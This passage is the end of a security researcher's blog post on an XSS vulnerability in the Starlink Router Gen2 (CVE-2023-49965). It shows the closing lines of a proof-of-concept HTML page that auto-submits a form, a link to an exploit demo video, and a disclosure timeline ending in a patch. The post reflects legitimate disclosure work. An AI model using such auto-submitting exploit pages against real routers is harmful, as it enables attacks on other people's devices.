</span></span><span style="display:flex;"><span>				document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;PoC&#34;</span>).<span style="color:#a6e22e">submit</span>();
</span></span><span style="display:flex;"><span>			});
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><h1 id="demo">Demo<a hidden class="anchor" aria-hidden="true" href="#demo">#</a></h1>
<hr>
<p><a href="/blog/2023-Starlink-Router-Gen2-XSS/Exploit-PoC.mp4">Exploit-PoC.mp4</a></p>
<h1 id="cve">CVE<a hidden class="anchor" aria-hidden="true" href="#cve">#</a></h1>
<ul>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-49965">CVE-2023-49965</a></li>
</ul>
<h1 id="time-line"><strong>Time Line</strong><a hidden class="anchor" aria-hidden="true" href="#time-line">#</a></h1>
<ul>
<li>2023-10-10 : Vulnerability reported to SpaceX/Starlink</li>
<li>2023-10-12 : Recognized as a security vulnerability with a severity of Moderate ( Reward <code>$500</code> USD )</li>
<li>2023-11-01 : Patched in the latest release (The fix is in versions <code>2023.48.0</code> and up)</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://hackintoanetwork.com/tags/spacex/">SpaceX</a></li>
      <li><a href="https://hackintoanetwork.com/tags/starlink/">Starlink</a></li>
      <li><a href="https://hackintoanetwork.com/tags/router/">Router</a></li>
      <li><a href="https://hackintoanetwork.com/tags/dishy/">Dishy</a></li>
      <li><a href="https://hackintoanetwork.com/tags/exploit/">Exploit</a></li>
      <li><a href="https://hackintoanetwork.com/tags/hacking/">Hacking</a></li>
      <li><a href="https://hackintoanetwork.com/tags/cve-2023-49965/">CVE-2023-49965</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://hackintoanetwork.com/">hackintoanetwork</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
